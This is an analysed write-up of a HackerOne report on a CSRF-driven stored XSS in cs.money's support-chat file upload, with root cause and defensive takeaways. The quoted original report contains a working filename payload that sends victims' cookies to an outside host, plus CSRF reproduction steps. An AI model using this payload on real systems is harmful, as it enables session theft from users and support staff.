# Blind XSS via CSRF on Image Upload - Support Chat

## Metadata
- **Source:** HackerOne
- **Report:** 1010466 | https://hackerone.com/reports/1010466
- **Submitted:** 2020-10-17
- **Reporter:** benjamin-mauss
- **Program:** cs.money
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), Insecure File Upload
- **CVEs:** None
- **Category:** web-api

## Summary
A CSRF vulnerability on the /upload_file endpoint combined with insufficient input sanitization in the filename parameter allows attackers to inject malicious JavaScript that executes in the support chat interface. The XSS is stored in the filename and triggered when support staff or the uploading user views the chat, enabling cookie theft and session hijacking.

## Attack scenario
1. Attacker crafts an HTML form containing a file input with a malicious filename payload (XSS code obfuscated as ASCII-encoded JavaScript)
2. Attacker hosts the HTML form on a controlled server and sends the link to a victim user
3. Victim clicks the link (or victim is simply logged in and visits attacker's page), causing a CSRF request to /upload_file with the malicious filename
4. The file is uploaded to support.cs.money with the XSS payload embedded in the filename parameter
5. When the victim or support staff opens the chat/support panel to view uploaded files, the stored XSS payload executes
6. The malicious JavaScript exfiltrates sensitive data (cookies, tokens) or performs actions on behalf of the victim

## Root cause
The /upload_file endpoint lacks CSRF token validation, Origin/Referer checks, and the filename parameter is not properly sanitized before being reflected in the support chat interface, allowing stored XSS execution.

## Attacker mindset
An attacker seeks persistent, delayed-execution XSS that doesn't require user interaction on the payload itself. By leveraging CSRF, the attacker can trick users into uploading malicious content without their knowledge. The use of ASCII encoding obfuscates the malicious intent from basic filters. The attacker recognized that support staff viewing chat logs would be high-value targets for credential theft.

## Defensive takeaways
- Implement CSRF token validation (synchronizer token pattern) on all state-changing endpoints including file uploads
- Validate Origin and Referer headers for cross-origin requests
- Implement strict input validation and sanitization for filename parameters, whitelist allowed characters
- Apply output encoding when displaying filenames in HTML context (HTML entity encoding)
- Use Content Security Policy (CSP) headers to restrict inline script execution and external resource loading
- Implement file upload restrictions: validate file types, rename files server-side, store outside web root
- Add file upload scanning for malicious content detection
- Implement proper access controls and audit logging for support chat functionality
- Use HttpOnly and Secure flags on sensitive cookies to prevent JavaScript access

## Variant hunting
Search for other file upload endpoints (profile pictures, attachments, documents) that may lack CSRF protection. Test filename, file content, and MIME type parameters for XSS. Check admin/support interfaces for stored XSS in user-uploaded content. Investigate other chat or messaging features for similar blind XSS vectors.

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1185
- T1539

## Notes
This is a blind/stored XSS because the payload doesn't immediately execute in the attacker's context but rather when viewed by other users. The combination of CSRF + XSS creates a particularly dangerous vulnerability as support staff, who are trusted administrators, become vectors for compromise. The ASCII encoding obfuscation is a bypass technique for string matching filters. The report demonstrates good understanding of attack mechanics but lacks explicit confirmation of successful exploitation (screenshot/video proof).

## Full report
<details><summary>Expand</summary>

## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

</details>

---
*Analysed by Claude on 2026-05-11*
